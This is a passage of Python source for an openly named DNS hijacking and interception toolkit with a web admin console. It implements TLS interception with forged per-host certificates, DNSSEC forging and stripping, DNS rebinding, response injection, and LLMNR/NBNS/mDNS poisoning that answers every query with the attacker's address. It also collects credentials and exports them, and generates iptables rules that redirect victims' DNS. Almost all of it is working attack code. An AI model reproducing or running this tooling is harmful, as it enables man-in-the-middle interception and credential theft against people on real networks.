                    c,k=make_host_cert(sname)
                    if c:
                        try: nctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); nctx.load_cert_chain(c,k); sslsock.context=nctx
                        except Exception: pass
                return None
            ctx.sni_callback=sni_cb; newsock=ctx.wrap_socket(newsock,server_side=True)
        except Exception:
            try: newsock.close()
            except Exception: pass
            raise
        return newsock,addr

# TCP relay
def relay_sockets(a,b):
    try:
        while True:
            r,_,e=select.select([a,b],[],[a,b],1.0)
            if e: break
            for s in r:
                try: data=s.recv(65536)
                except Exception: return
                if not data: return
                o=b if s is a else a
                try: o.sendall(data)
                except Exception: return
    finally:
        for s in (a,b):
            try: s.close()
            except Exception: pass
class TCPRelayHandler(BaseRequestHandler):
    def handle(self):
        with STATE['lock']: STATE['stats']['tcp_relay']+=1
        up=self.server.upstream
        try:
            u=socket.socket(socket.AF_INET,socket.SOCK_STREAM); u.settimeout(10); u.connect(up)
        except Exception as e: emit('relay_err',{'err':str(e)}); return
        emit('relay',{'src':self.client_address,'up':up}); relay_sockets(self.request,u)
class TCPRelayServer(ThreadingMixIn,TCPServer):
    allow_reuse_address=True
    def __init__(self,addr,handler,upstream): super().__init__(addr,handler); self.upstream=upstream

# PCAP/replay
def pcap_start(iface,out,bpf):
    if shutil.which('tcpdump') is None: return False,'tcpdump not found'
    pcap_stop()
    try:
        p=subprocess.Popen(['tcpdump','-i',iface,'-w',out,bpf],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        with STATE['lock']: STATE['pcap_proc']=p; STATE['pcap_file']=out
        emit('pcap',{'action':'start','file':out,'pid':p.pid}); return True,out
    except Exception as e: return False,str(e)
def pcap_stop():
    with STATE['lock']: p=STATE['pcap_proc']; STATE['pcap_proc']=None
    if p:
        try: p.terminate(); p.wait(timeout=3)
        except Exception:
            try: p.kill()
            except Exception: pass
        return True
    return False
def replay_http(events,target_base,limit=20):
    sent=0; res=[]
    for ev in events:
        if ev.get('type')!='http_req' or sent>=limit: continue
        url=target_base.rstrip('/')+ev.get('path','/'); host=ev.get('host','')
        try:
            r=Request(url,method=ev.get('method','GET')); r.add_header('Host',host)
            with urlopen(r,timeout=8) as rp: st=rp.status
        except Exception as e: st=str(e)
        res.append({'url':url,'host':host,'status':st}); sent+=1
    with STATE['lock']: STATE['stats']['replay']+=sent
    return res

# Profiles & audit
def profile_dump():
    with STATE['lock']:
        return {'profile':STATE['profile_name'],'mode':STATE['mode'],'default_ip':STATE['default_ip'],'upstream':STATE['upstream'],'upstream_mode':STATE['upstream_mode'],'upstream_doh':STATE['upstream_doh'],'ttl':STATE['ttl'],'rules':STATE['rules'],'fake':STATE['fake'],'split_allow_hosts':STATE['split_allow_hosts'],'split_deny_hosts':STATE['split_deny_hosts'],'acl_allow':STATE['acl_allow'],'acl_deny':STATE['acl_deny'],'templates_dir':STATE['templates_dir'],'hook_script':STATE['hook_script']}
def profile_apply(cfg):
    with STATE['lock']:
        for k in ['profile_name','mode','default_ip','upstream','upstream_mode','upstream_doh','ttl','rules','fake','split_allow_hosts','split_deny_hosts','acl_allow','acl_deny','templates_dir','hook_script']:
            kk='profile' if k=='profile_name' else k
            if kk in cfg: STATE[k if k!='profile_name' else 'profile_name']=cfg[kk]
def profile_save(name):
    os.makedirs(PROFILES_DIR,exist_ok=True); p=os.path.join(PROFILES_DIR,re.sub(r'[^a-zA-Z0-9_.-]','_',name)+'.json')
    cfg=profile_dump(); cfg['profile']=name; open(p,'w',encoding='utf-8').write(json.dumps(cfg,ensure_ascii=False,indent=2)); return p
def profile_load(name):
    p=os.path.join(PROFILES_DIR,re.sub(r'[^a-zA-Z0-9_.-]','_',name)+'.json')
    cfg=json.loads(open(p,'r',encoding='utf-8').read()); profile_apply(cfg); return cfg

def reload_config(path):
    try:
        if not path or not os.path.exists(path): return
        cfg = json.loads(open(path,'r',encoding='utf-8').read())
        profile_apply(cfg)
        log.info(f"热加载配置: {path}")
        emit('config_reload',{'file':path})
    except Exception as e:
        log.warning(f"config reload fail: {e}")


def proxy_urlopen(req, timeout=8):
    # route through STATE proxy_upstream if set, else direct
    with STATE['lock']: pu=STATE['proxy_upstream']
    if not pu:
        return urlopen(req, timeout=timeout)
    u=urlparse(req.full_url)
    host=u.hostname; port=u.port or (443 if u.scheme=='https' else 80)
    s=proxy_open(host,port,pu,timeout=timeout)
    # send HTTP request over tunnel
    path=u.path or '/'
    if u.query: path+='?'+u.query
    data=req.data if hasattr(req,'data') else None
    lines=[f"{req.get_method()} {path} HTTP/1.1", f"Host: {u.netloc}"]
    for k,v in req.header_items():
        if k.lower() not in ('host','content-length'): lines.append(f"{k}: {v}")
    if data: lines.append(f"Content-Length: {len(data)}")
    lines.append(""); lines.append("")
    s.sendall(("\r\n".join(lines)).encode())
    if data: s.sendall(data)
    # read response
    buf=b''
    while b"\r\n\r\n" not in buf:
        c=s.recv(4096)
        if not c: break
        buf+=c
    head,buf=buf.split(b"\r\n\r\n",1)
    status=int(head.split(b" ",2)[1])
    # headers
    hdrs={}
    for line in head.split(b"\r\n")[1:]:
        if b":" in line:
            k,v=line.split(b":",1); hdrs[k.decode().strip().lower()]=v.decode().strip()
    # body
    cl=int(hdrs.get('content-length','0') or 0)
    while len(buf)<cl:
        c=s.recv(4096)
        if not c: break
        buf+=c
    body=buf[:cl] if cl else buf
    class _R:
        def __init__(self,status,body,headers): self.status=status; self._body=body; self.headers=headers
        def read(self): return self._body
        def __enter__(self): return self
        def __exit__(self,*a): 
            try: s.close()
            except Exception: pass
    return _R(status,body,hdrs)

def profile_list():
    os.makedirs(PROFILES_DIR,exist_ok=True); return sorted([f[:-5] for f in os.listdir(PROFILES_DIR) if f.endswith('.json')])

def audit_export():
    with STATE['lock']: key=STATE['audit_key'].encode(); ev=list(STATE['events']); cr=list(STATE['creds']); cfg=profile_dump()
    payload={'ts':datetime.utcnow().isoformat()+'Z','profile':cfg,'events':ev,'creds':cr}
    raw=json.dumps(payload,ensure_ascii=False,sort_keys=True).encode()
    sig=hmac.new(key,raw,hashlib.sha256).hexdigest()
    return {'signature':{'alg':'HMAC-SHA256','value':sig}, 'payload':payload}

# iptables/tproxy helper generator
def gen_iptables_script(bind_ip, dns_port, http_port, https_port):
    return f"""#!/bin/sh
# TPROXY/iptables helper (Linux, 需root). 仅生成脚本供审阅后执行。
# 1) DNS重定向到本机 {bind_ip}:{dns_port}
iptables -t nat -A OUTPUT -p udp --dport 53 -j DNAT --to-destination {bind_ip}:{dns_port}
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination {bind_ip}:{dns_port}
# 2) 可选: HTTP/HTTPS重定向(透明代理思路)
# iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination {bind_ip}:{http_port}
# iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination {bind_ip}:{https_port}
# 3) TPROXY(需策略路由/ip rule/mangle)示例略，按内核与网络拓扑调整。
echo done
"""

# Admin
ADMIN_HTML='''<!doctype html><html><head><meta charset='utf-8'><title>DNSHijack Admin++++</title>
<style>body{font-family:system-ui,Arial;margin:0;background:#0b1020;color:#e8eefc}header{padding:12px;background:#121a33}
.wrap{padding:12px;display:grid;grid-template-columns:1fr 1fr;gap:10px}.card{background:#121a33;border:1px solid #223;border-radius:10px;padding:10px}
textarea,input,select{width:100%;box-sizing:border-box;background:#0b1020;color:#e8eefc;border:1px solid #334;border-radius:6px;padding:7px}
button{background:#3b82f6;color:#fff;border:0;border-radius:6px;padding:6px 10px;cursor:pointer;margin:2px}pre{white-space:pre-wrap;background:#0b1020;padding:8px;border-radius:6px;max-height:220px;overflow:auto;font-size:12px}</style></head><body>
<header><b>DNS Hijack 全能控制台++++</b></header>
<div class='wrap'>
<div class='card'><h3>状态</h3><pre id='st'></pre>
模式<select id='mode'><option>selective</option><option>all</option><option>forward</option></select><button onclick="P('/api/mode',{mode:mode.value})">应用</button>
默认IP<input id='dip'/><button onclick="P('/api/default_ip',{ip:dip.value})">应用</button>
上游UDP<input id='up'/><button onclick="P('/api/upstream',{upstream:up.value.split(',').map(s=>s.trim()).filter(Boolean)})">应用</button>
上游模式<select id='um'><option>udp</option><option>doh</option></select> DoH URL<input id='doh'/><button onclick="P('/api/upstream_mode',{upstream_mode:um.value,upstream_doh:doh.value})">应用</button></div>
<div class='card'><h3>规则/分流/ACL</h3><textarea id='rules' rows='6'></textarea><button onclick="P('/api/rules',JSON.parse(rules.value))">热重载规则</button>
白名单bypass(逗号)<input id='sa'/> 强制劫持<input id='sd'/><button onclick="P('/api/split',{allow:sa.value.split(','),deny:sd.value.split(',')})">应用分流</button></div>
<div class='card'><h3>Profile/审计/iptables脚本</h3>
名称<input id='pn'/><button onclick="P('/api/profile/save',{name:pn.value})">保存</button><button onclick="loadProfile()">加载</button><button onclick="L()">列表/刷新</button>
<pre id='plist'></pre><a href='/api/audit/export' target='_blank'><button>导出审计(HMAC签名)</button></a> <a href='/api/iptables/script' target='_blank'><button>生成iptables脚本</button></a></div>
<div class='card'><h3>伪造/模板/PCAP/重放</h3>
AAAA<input id='f6'/>TXT<input id='ft'/><button onclick="P('/api/fake',{AAAA:f6.value,TXT:ft.value})">应用伪造</button>
模板dir<input id='td'/>Hook<input id='hk'/><button onclick="P('/api/template_cfg',{templates_dir:td.value,hook_script:hk.value})">应用</button>
iface<input id='iface' value='any'/>pcap<input id='pf' value='cap.pcap'/><button onclick="P('/api/pcap/start',{iface:iface.value,file:pf.value,bpf:'port 53 or port 80 or port 443'})">抓包</button><button onclick="P('/api/pcap/stop',{})">停</button>
重放目标<input id='rt' value='http://127.0.0.1'/><button onclick="replay()">重放</button><pre id='rr'></pre></div>
<div class='card'><h3>事件</h3><pre id='ev'></pre><a href='/api/export/events' target='_blank'><button>导出</button></a></div>
<div class='card'><h3>凭据线索</h3><pre id='cr'></pre><a href='/api/export/creds' target='_blank'><button>导出</button></a></div>
</div><script>
async function J(u,o){const r=await fetch(u,o);return r.json()} async function P(u,b){await J(u,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(b)});L()}
async function L(){const s=await J('/api/state');st.innerText=JSON.stringify(s.stats,null,2);mode.value=s.mode;dip.value=s.default_ip;up.value=s.upstream.join(',');um.value=s.upstream_mode;doh.value=s.upstream_doh;rules.value=JSON.stringify(s.rules,null,2);sa.value=(s.split_allow_hosts||[]).join(',');sd.value=(s.split_deny_hosts||[]).join(',');f6.value=s.fake.AAAA;ft.value=s.fake.TXT;td.value=s.templates_dir;hk.value=s.hook_script;pn.value=s.profile;plist.innerText=JSON.stringify(await J('/api/profile/list'),null,2);ev.innerText=JSON.stringify(await J('/api/events'),null,2);cr.innerText=JSON.stringify(await J('/api/creds'),null,2)}
async function loadProfile(){await J('/api/profile/load',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:pn.value})});L()}
async function replay(){rr.innerText=JSON.stringify(await J('/api/replay',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target:rt.value,limit:20})}),null,2)}
L(); setInterval(async()=>{ev.innerText=JSON.stringify(await J('/api/events'),null,2)},7000)
</script></body></html>'''

class AdminHandler(BaseHTTPRequestHandler):
    def log_message(self,fmt,*a): pass
    def _send(self,code,obj,ctype='application/json; charset=utf-8'):
        data=(json.dumps(obj,ensure_ascii=False).encode() if isinstance(obj,(dict,list)) else (obj.encode() if isinstance(obj,str) else obj))
        self.send_response(code); self.send_header('Content-Type',ctype); self.send_header('Content-Length',str(len(data))); self.end_headers(); self.wfile.write(data)
    def _body(self):
        try: n=int(self.headers.get('Content-Length') or 0); return self.rfile.read(n) if n>0 else b''
        except Exception: return b''
    def do_GET(self):
        if not admin_auth_ok(self): return self._send(401,{'e':'unauth'})
        p=urlparse(self.path).path
        if p in ('/','/index.html'): return self._send(200,ADMIN_HTML,'text/html; charset=utf-8')
        if p=='/api/state':
            with STATE['lock']: return self._send(200,{'mode':STATE['mode'],'default_ip':STATE['default_ip'],'upstream':STATE['upstream'],'upstream_mode':STATE['upstream_mode'],'upstream_doh':STATE['upstream_doh'],'ttl':STATE['ttl'],'rules':STATE['rules'],'stats':STATE['stats'],'fake':STATE['fake'],'split_allow_hosts':STATE['split_allow_hosts'],'split_deny_hosts':STATE['split_deny_hosts'],'templates_dir':STATE['templates_dir'],'hook_script':STATE['hook_script'],'profile':STATE['profile_name'],'ca':CA_CRT,'admin_token':STATE['admin_token'],'tenant':STATE['tenant'],'dnssec_forge':STATE['dnssec_forge'],'domain_filter_mode':STATE['domain_filter_mode'],'block_domains':STATE['block_domains'],'allow_domains':STATE['allow_domains'],'upstream_lb':STATE['upstream_lb'],'ecs_enabled':STATE['ecs_enabled'],'ecs_subnet':STATE['ecs_subnet'],'http_redirect_mode':STATE['http_redirect_mode'],'http_redirect_url':STATE['http_redirect_url'],'captive_portal':STATE['captive_portal'],'captive_portal_url':STATE['captive_portal_url'],'tunnel_detect':STATE['tunnel_detect'],'auto_ban':STATE['auto_ban'],'banned_ips':STATE['banned_ips'],'cache_prewarm':STATE['cache_prewarm'],'upstream_tee':STATE['upstream_tee'],'response_inject':STATE['response_inject'],'upstream_mode_dot':STATE['upstream_mode_dot'],'upstream_dot':STATE['upstream_dot'],'ca_info':STATE['ca_info'],'dnssec_strip':STATE['dnssec_strip'],'aaaa_priority':STATE['aaaa_priority'],'ipv6_only':STATE['ipv6_only'],'geoip_db':STATE['geoip_db'],'geo_allow_cidrs':STATE['geo_allow_cidrs'],'geo_deny_cidrs':STATE['geo_deny_cidrs'],'webhook_url':STATE['webhook_url'],'playbook':STATE['playbook'],'doq_enabled':STATE['doq_enabled'],'topology':STATE['topology'],'admin_allow_ips':STATE['admin_allow_ips'],'rebind_pool':STATE['rebind_pool'],'rebind_rules':STATE['rebind_rules'],'rate_limit_max':STATE['rate_limit_max'],'rate_limit_window':STATE['rate_limit_window'],'delay_ms':STATE['delay_ms'],'mdns_enabled':STATE['mdns_enabled'],'proxy_upstream':STATE['proxy_upstream']})
        if p=='/api/events':
            with STATE['lock']: return self._send(200,list(STATE['events'])[-200:])
        if p=='/api/creds':
            with STATE['lock']: return self._send(200,list(STATE['creds'])[-200:])
        if p=='/api/export/events':
            with STATE['lock']: data=json.dumps(list(STATE['events']),ensure_ascii=False,indent=2).encode(); self.send_response(200); self.send_header('Content-Type','application/json'); self.send_header('Content-Disposition','attachment; filename=events.json'); self.end_headers(); self.wfile.write(data); return
        if p=='/api/export/creds':
            with STATE['lock']: data=json.dumps(list(STATE['creds']),ensure_ascii=False,indent=2).encode(); self.send_response(200); self.send_header('Content-Type','application/json'); self.send_header('Content-Disposition','attachment; filename=creds.json'); self.end_headers(); self.wfile.write(data); return
        if p=='/api/profile/list': return self._send(200,profile_list())
        if p=='/api/session/timeline':
            with STATE['lock']: evs=list(STATE['events']); return self._send(200,{'count':len(evs),'events':evs[-500:]})
        if p=='/api/topology':
            with STATE['lock']: return self._send(200,STATE['topology'])
        if p=='/api/upstream_health':
            with STATE['lock']: return self._send(200,STATE['upstream_health'])
        if p=='/api/banned':
            with STATE['lock']: return self._send(200,{'banned':STATE['banned_ips']})
        if p=='/api/qps':
            with STATE['lock']: return self._send(200,{'window':len(STATE['qps_stats']['window']),'per_domain':STATE['qps_stats']['per_domain'],'per_client':{k:len(v) for k,v in STATE['qps_stats']['per_client'].items()}})
        if p=='/api/ca/info':
            return self._send(200, ca_info_collect())
        if p=='/api/pcap/parse':
            qp=parse_qs(urlparse(self.path).query); f=qp.get('file',[''])[0]
            if not f: f=os.path.join(BASE_DIR,'capture.pcap')
            else: f=os.path.join(BASE_DIR, os.path.basename(f))
            return self._send(200, pcap_parse_creds(f))
        if p=='/api/playbook/run':
            qp=parse_qs(urlparse(self.path).query); f=qp.get('file',[''])[0]
            if not f: f=STATE['playbook'] if False else ''
            with STATE['lock']: pb=STATE['playbook']
            path = f or pb
            if not path: return self._send(400,{'e':'no playbook'})
            return self._send(200, run_playbook(os.path.join(BASE_DIR, os.path.basename(path)) if not os.path.isabs(path) else path))
        if p=='/api/audit/export':
            data=json.dumps(audit_export(),ensure_ascii=False,indent=2).encode(); self.send_response(200); self.send_header('Content-Type','application/json'); self.send_header('Content-Disposition','attachment; filename=audit.json'); self.end_headers(); self.wfile.write(data); return
        if p=='/api/iptables/script':
            with STATE['lock']: dip=STATE['default_ip']
            s=gen_iptables_script(dip,53,80,443).encode(); self.send_response(200); self.send_header('Content-Type','text/x-shellscript'); self.send_header('Content-Disposition','attachment; filename=iptables_hijack.sh'); self.end_headers(); self.wfile.write(s); return
        self._send(404,{'e':'nf'})
    def do_POST(self):
        if not admin_auth_ok(self): return self._send(401,{'e':'unauth'})
        p=urlparse(self.path).path
        try: obj=json.loads(self._body().decode('utf-8') or '{}')
        except Exception: obj={}
        if p=='/api/rules' and isinstance(obj,list):
            norm=[{"type":r.get('type','exact'),"pattern":str(r.get('pattern','')).strip(),"ip":(str(r.get('ip','')).strip() or None),"enabled":bool(r.get('enabled',True))} for r in obj if isinstance(r,dict)]
            with STATE['lock']: STATE['rules']=norm; return self._send(200,{'ok':1,'count':len(norm)})
        if p=='/api/mode' and obj.get('mode') in ('selective','all','forward'):
            with STATE['lock']: STATE['mode']=obj['mode']; return self._send(200,{'ok':1})
        if p=='/api/default_ip' and obj.get('ip'):
            with STATE['lock']: STATE['default_ip']=obj['ip']; return self._send(200,{'ok':1})
        if p=='/api/upstream' and isinstance(obj.get('upstream'),list):
            with STATE['lock']: STATE['upstream']=[str(x).strip() for x in obj['upstream'] if str(x).strip()]; return self._send(200,{'ok':1})
        if p=='/api/upstream_mode':
            with STATE['lock']: STATE['upstream_mode']=obj.get('upstream_mode','udp'); STATE['upstream_doh']=obj.get('upstream_doh',STATE['upstream_doh']); return self._send(200,{'ok':1})
        if p=='/api/split':
            with STATE['lock']: STATE['split_allow_hosts']=[s.strip() for s in (obj.get('allow') or []) if str(s).strip()]; STATE['split_deny_hosts']=[s.strip() for s in (obj.get('deny') or []) if str(s).strip()]; return self._send(200,{'ok':1})
        if p=='/api/fake':
            with STATE['lock']: STATE['fake'].update({k:obj.get(k,STATE['fake'].get(k,'')) for k in ('AAAA','CNAME','TXT','MX')}); return self._send(200,{'ok':1})
        if p=='/api/template_cfg':
            with STATE['lock']: STATE['templates_dir']=obj.get('templates_dir',''); STATE['hook_script']=obj.get('hook_script',''); return self._send(200,{'ok':1})
        if p=='/api/pcap/start':
            ok,info=pcap_start(obj.get('iface','any'), os.path.join(BASE_DIR,obj.get('file','cap.pcap')), obj.get('bpf','port 53 or port 80 or port 443')); return self._send(200,{'ok':ok,'info':info})
        if p=='/api/pcap/stop': return self._send(200,{'ok':pcap_stop()})
        if p=='/api/profile/save': return self._send(200,{'ok':1,'path':profile_save(obj.get('name','default'))})
        if p=='/api/profile/load': return self._send(200,{'ok':1,'cfg':profile_load(obj.get('name','default'))})
        if p=='/api/replay':
            with STATE['lock']: evs=list(STATE['events']); return self._send(200,{'results':replay_http(evs,obj.get('target','http://127.0.0.1'),int(obj.get('limit',20)))})
        if p=='/api/ttl':
            with STATE['lock']: STATE['ttl']=max(0,min(int(obj.get('ttl',60)),86400)); return self._send(200,{'ok':1})
        if p=='/api/domain_filter':
            with STATE['lock']:
                STATE['domain_filter_mode']=obj.get('mode',STATE['domain_filter_mode'])
                STATE['block_domains']=[s.strip() for s in (obj.get('block') or STATE['block_domains']) if str(s).strip()] if 'block' in obj else STATE['block_domains']
                STATE['allow_domains']=[s.strip() for s in (obj.get('allow') or STATE['allow_domains']) if str(s).strip()] if 'allow' in obj else STATE['allow_domains']
            return self._send(200,{'ok':1})
        if p=='/api/upstream_lb':
            with STATE['lock']:
                STATE['upstream_lb']=obj.get('mode',STATE['upstream_lb'])
                STATE['upstream_check_interval']=int(obj.get('interval',STATE['upstream_check_interval']))
            return self._send(200,{'ok':1})
        if p=='/api/upstream_health/refresh':
            upstream_health_refresh(); 
            with STATE['lock']: h=dict(STATE['upstream_health']); return self._send(200,h)
        if p=='/api/ecs':
            with STATE['lock']:
                STATE['ecs_enabled']=bool(obj.get('enabled',STATE['ecs_enabled']))
                STATE['ecs_subnet']=obj.get('subnet',STATE['ecs_subnet'])
            return self._send(200,{'ok':1})
        if p=='/api/http_redirect':
            with STATE['lock']:
                STATE['http_redirect_mode']=bool(obj.get('enabled',STATE['http_redirect_mode']))
                STATE['http_redirect_url']=obj.get('url',STATE['http_redirect_url'])
                STATE['captive_portal']=bool(obj.get('captive',STATE['captive_portal']))
                STATE['captive_portal_url']=obj.get('captive_url',STATE['captive_portal_url'])
            return self._send(200,{'ok':1})
        if p=='/api/tunnel':
            with STATE['lock']:
                STATE['tunnel_detect']=bool(obj.get('enabled',STATE['tunnel_detect']))
                STATE['tunnel_max_len']=int(obj.get('max_len',STATE['tunnel_max_len']))
                STATE['auto_ban']=bool(obj.get('auto_ban',STATE['auto_ban']))
                STATE['auto_ban_threshold']=int(obj.get('threshold',STATE['auto_ban_threshold']))
                STATE['auto_ban_window']=int(obj.get('window',STATE['auto_ban_window']))
            return self._send(200,{'ok':1})
        if p=='/api/ban':
            with STATE['lock']:
                if obj.get('ip'): 
                    if obj.get('unban'): 
                        if obj['ip'] in STATE['banned_ips']: STATE['banned_ips'].remove(obj['ip'])
                    else:
                        if obj['ip'] not in STATE['banned_ips']: STATE['banned_ips'].append(obj['ip'])
            return self._send(200,{'ok':1})
        if p=='/api/cache_prewarm':
            with STATE['lock']: STATE['cache_prewarm']=[s.strip() for s in (obj.get('domains') or []) if str(s).strip()]
            cache_prewarm()
            return self._send(200,{'ok':1})
        if p=='/api/response_inject':
            with STATE['lock']: STATE['response_inject']=obj.get('map',STATE['response_inject'])
            return self._send(200,{'ok':1})
        if p=='/api/pcap/auto_extract':
            qp=parse_qs(urlparse(self.path).query); f=qp.get('file',[''])[0]
            if not f: f=os.path.join(BASE_DIR,'capture.pcap')
            else: f=os.path.join(BASE_DIR, os.path.basename(f))
            return self._send(200, pcap_auto_extract(f))
        if p=='/api/ca/info':
            return self._send(200, ca_info_collect())
        if p=='/api/upstream_dot':
            with STATE['lock']:
                STATE['upstream_mode_dot']=bool(obj.get('enabled',STATE['upstream_mode_dot']))
                STATE['upstream_dot']=obj.get('server',STATE['upstream_dot'])
            return self._send(200,{'ok':upstream_dot_check()})
        if p=='/api/qps':
            with STATE['lock']:
                return self._send(200,{'window':len(STATE['qps_stats']['window']),'per_domain':STATE['qps_stats']['per_domain'],'per_client':{k:len(v) for k,v in STATE['qps_stats']['per_client'].items()}})
        if p=='/api/tee':
            with STATE['lock']: STATE['upstream_tee']=[s.strip() for s in (obj.get('servers') or []) if str(s).strip()]
            return self._send(200,{'ok':1})
        if p=='/api/tenant':
            with STATE['lock']: STATE['tenant']=obj.get('tenant',STATE['tenant']); return self._send(200,{'ok':1})
        if p=='/api/dnssec':
            with STATE['lock']: STATE['dnssec_forge']=bool(obj.get('forge',STATE['dnssec_forge'])); STATE['dnssec_strip']=bool(obj.get('strip',STATE['dnssec_strip'])); return self._send(200,{'ok':1})
        if p=='/api/ipv6policy':
            with STATE['lock']: STATE['aaaa_priority']=bool(obj.get('aaaa_priority',STATE['aaaa_priority'])); STATE['ipv6_only']=bool(obj.get('ipv6_only',STATE['ipv6_only'])); return self._send(200,{'ok':1})
        if p=='/api/geoip':
            with STATE['lock']: STATE['geoip_db']=obj.get('db',STATE['geoip_db']); STATE['geo_allow_cidrs']=[s.strip() for s in (obj.get('allow') or []) if str(s).strip()]; STATE['geo_deny_cidrs']=[s.strip() for s in (obj.get('deny') or []) if str(s).strip()]; return self._send(200,{'ok':1})
        if p=='/api/webhook':
            with STATE['lock']: STATE['webhook_url']=obj.get('url',STATE['webhook_url']); STATE['webhook_min_severity']=obj.get('min_severity',STATE['webhook_min_severity']); return self._send(200,{'ok':1})
        if p=='/api/playbook':
            with STATE['lock']: STATE['playbook']=obj.get('path',STATE['playbook']); return self._send(200,{'ok':1})
        if p=='/api/playbook/run':
            with STATE['lock']: pb=STATE['playbook']
            path = obj.get('path') or pb
            if not path: return self._send(400,{'e':'no playbook'})
            full = path if os.path.isabs(path) else os.path.join(BASE_DIR, os.path.basename(path))
            return self._send(200, run_playbook(full))
        if p=='/api/doq':
            with STATE['lock']: STATE['doq_enabled']=bool(obj.get('enabled',False))
            if obj.get('enabled') and HAS_QUIC:
                dc,dk = make_host_cert('doq.local')
                if dc:
                    ok,msg = doq_start(dc,dk,None, obj.get('port',853))
                    return self._send(200,{'ok':ok,'msg':msg})
            return self._send(200,{'ok':False,'msg':'quic unavailable or disabled'})
        if p=='/api/topology/reset':
            with STATE['lock']: STATE['topology']={"nodes":[],"edges":[]}; return self._send(200,{'ok':1})
        if p=='/api/admin_auth':
            with STATE['lock']:
                STATE['admin_token']=obj.get('token',STATE['admin_token'])
                STATE['admin_allow_ips']=[s.strip() for s in (obj.get('allow_ips') or []) if str(s).strip()]
            return self._send(200,{'ok':1})
        if p=='/api/rebind':
            with STATE['lock']:
                STATE['rebind_pool']=[s.strip() for s in (obj.get('pool') or []) if str(s).strip()]
                STATE['rebind_rules']=[s.strip() for s in (obj.get('rules') or []) if str(s).strip()]
                STATE['rebind_idx']=0
            return self._send(200,{'ok':1})
        if p=='/api/ratelimit':
            with STATE['lock']:
                STATE['rate_limit_max']=int(obj.get('max',STATE['rate_limit_max']))
                STATE['rate_limit_window']=int(obj.get('window',STATE['rate_limit_window']))
            return self._send(200,{'ok':1})
        if p=='/api/delay':
            with STATE['lock']: STATE['delay_ms']=int(obj.get('ms',0))
            return self._send(200,{'ok':1})
        if p=='/api/mdns':
            with STATE['lock']: STATE['mdns_enabled']=bool(obj.get('enabled',False))
            return self._send(200,{'ok':1})
        if p=='/api/proxy':
            with STATE['lock']: STATE['proxy_upstream']=obj.get('url','')
            return self._send(200,{'ok':1})
        if p=='/api/config/reload':
            reload_config(obj.get('path') or STATE['config_file']); return self._send(200,{'ok':1})
        if p=='/api/config/watch':
            with STATE['lock']: STATE['config_file']=obj.get('path','')
            return self._send(200,{'ok':1})

        self._send(400,{'e':'bad'})

# CLI/main
def parse_rules(rules_file, inline_rules, default_ip):
    rules=[]
    def add(pat,ip):
        rt='regex' if pat.startswith('re:') else ('wildcard' if pat.startswith('*.') or pat=='*' else 'exact')
        if rt=='regex': pat=pat[3:]
        rules.append({"type":rt,"pattern":pat.lower(),"ip":ip,"enabled":True})
    if rules_file and os.path.exists(rules_file):
        for line in open(rules_file,'r',encoding='utf-8',errors='ignore'):
            line=line.strip()
            if not line or line.startswith('#'): continue
            ps=line.split(); add(ps[0], ps[1] if len(ps)>1 else default_ip)
    for r in inline_rules or []:
        d,ip=(r.split('=',1)+[default_ip])[:2] if '=' in r else (r,default_ip); add(d.strip(),ip.strip())
    return rules
def start_tcp_relays(specs,bind):
    srvs=[]
    for spec in specs or []:
        try:
            lp,uh,up=spec.split(':'); s=TCPRelayServer((bind,int(lp)),TCPRelayHandler,(uh,int(up))); srvs.append(s); threading.Thread(target=s.serve_forever,daemon=True).start(); log.info(f"TCP转发 {lp}->{uh}:{up}")
        except Exception as e: log.error(f"relay {spec}: {e}")
    return srvs


def mdns_responder(bind_ip):
    # Listen LLMNR(5355) UDP + NBNS(137) UDP + mDNS(5353) UDP, reply with bind_ip for any query
    socks=[]
    for port,proto in ((5353,'mdns'),(5355,'llmnr'),(137,'nbns')):
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
            try: s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEPORT,1)
            except Exception: pass
            s.bind(('0.0.0.0',port)); s.settimeout(1.0); socks.append((s,port,proto))
        except Exception as e:
            log.warning(f"responder bind {port}: {e}")
    while True:
        with STATE['lock']: enabled=STATE['mdns_enabled']
        if not enabled:
            time.sleep(1); continue
        for s,port,proto in socks:
            try:
                data,addr=s.recvfrom(4096)
            except socket.timeout: continue
            except Exception: continue
            # build a minimal response echoing question with A record -> bind_ip
            try:
                if len(data)<12: continue
                tid=data[:2]; flags=struct.unpack('!H',data[2:4])[0]
                if flags & 0x8000: continue
                qd=struct.unpack('!H',data[4:6])[0]
                # parse first question
                off=12; qname,off=parse_dns_name(data,off)
                if off+4>len(data): continue
                qtype,qclass=struct.unpack('!HH',data[off:off+4]); off+=4
                if qtype not in (1,255): continue
                resp=struct.pack('!HHHHHH',struct.unpack('!H',tid)[0],0x8180,qd,1,0,0)+data[12:off]
                resp+=b'\xc0\x0c'+struct.pack('!HHIH',1,1,60,4)+socket.inet_aton(bind_ip)
                s.sendto(resp,addr)
                emit('mdns_reply',{'proto':proto,'qname':qname,'src':addr[0]})
            except Exception: pass
        time.sleep(0.05)

# ---- v6 helpers ----
def geoip_lookup(ip):
    with STATE["lock"]: db=STATE["geoip_db"]
    if not db or not HAS_GEOIP or not os.path.exists(db):
        return {}
    try:
        with _geoip2_db.Reader(db) as r:
            resp = r.country(ip)
            return {"country": resp.country.iso_code, "name": resp.country.name}
    except Exception:
        return {}

def tenant_ok(req_tenant):
    with STATE["lock"]: t=STATE["tenant"]
    return (not req_tenant) or req_tenant==t

def ip_in_cidrs(ip, cidrs):
    try:
        addr = ipaddress.ip_address(ip)
    except Exception:
        return False
    for c in cidrs or []:
        try:
            if addr in ipaddress.ip_network(c, strict=False):
                return True
        except Exception:
            continue
    return False

def webhook_push(event, min_sev="info"):
    with STATE["lock"]: url=STATE["webhook_url"]; ms=STATE["webhook_min_severity"]
    if not url: return
    sev_order = {"debug":0,"info":1,"warn":2,"error":3}
    if sev_order.get(event.get("severity","info"),1) < sev_order.get(ms,1): return
    try:
        data = json.dumps(event, ensure_ascii=False).encode()
